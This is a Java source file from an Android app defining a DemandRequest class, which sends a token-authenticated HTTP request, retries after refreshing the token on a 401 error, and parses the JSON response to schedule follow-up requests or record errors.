package com.inet.android.request;

import java.io.UnsupportedEncodingException;
import java.util.concurrent.TimeUnit;

import org.apache.http.Header;
import org.apache.http.message.BasicHeader;
import org.json.JSONException;
import org.json.JSONObject;

import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.list.Queue;
import com.inet.android.utils.Logging;
import com.loopj.android.http.RequestParams;

import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.util.Log;

public class DemandRequest extends DefaultRequest {
	private final String LOG_TAG = DataRequest.class.getSimpleName().toString();

	private final Context mContext;
	static RequestDataBaseHelper db;
	private SharedPreferences sp;
	final private int ADD_NUMBER = 50;
	private int type;

	public DemandRequest(Context ctx) {
		super(ctx);
		this.mContext = ctx;
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
	}

	@Override
	public void sendRequest(final RequestParams params, int type) {
		final Header[] headers = { new BasicHeader("Accept", "application/json"),
				new BasicHeader("Authorization", "Bearer " + sp.getString("access_second_token", "")) };
		this.type = type;
		Log.d(LOG_TAG, params.toString());

		final Caller caller = Caller.getInstance();
		caller.makeRequest(mContext, AppConstants.LIST_LINK, headers, params, new RequestListener() {

			@Override
			public void onSuccess(int arg0, Header[] arg1, JSONObject timeline) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onSuccess(int arg0, Header[] arg1, byte[] response) {
				try {
					getRequestData(response);
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}

			@Override
			public void onFailure(int arg0, byte[] errorResponse) {
				// TODO Auto-generated method stub
				if (arg0 == 401) {
					caller.sendRequestForSecondToken(mContext);
					try {
						// TimeUnit.SECONDS.sleep(1);
						TimeUnit.MILLISECONDS.sleep(1000);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
					sendRequest(params);
				}
			}
		});

	}

	@Override
	protected void getRequestData(byte[] response) throws UnsupportedEncodingException {
		Parser parser = new Parser(mContext);
		String[] check = null;
		try {
			check = parser.parsing(response);
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if (check[0] != null) {
			if (check[0].equals("2")) {
				RequestList.sendPeriodicRequest(mContext);
			} else if (check[0].equals("0"))
				Logging.doLog(LOG_TAG, "equals 2", "equals 2");
			Queue.setList(type + ADD_NUMBER, 0, "0", mContext);
		} else if (check[0].equals("0"))
			DisassemblyErrors.setError(check[1], mContext);
	}
}
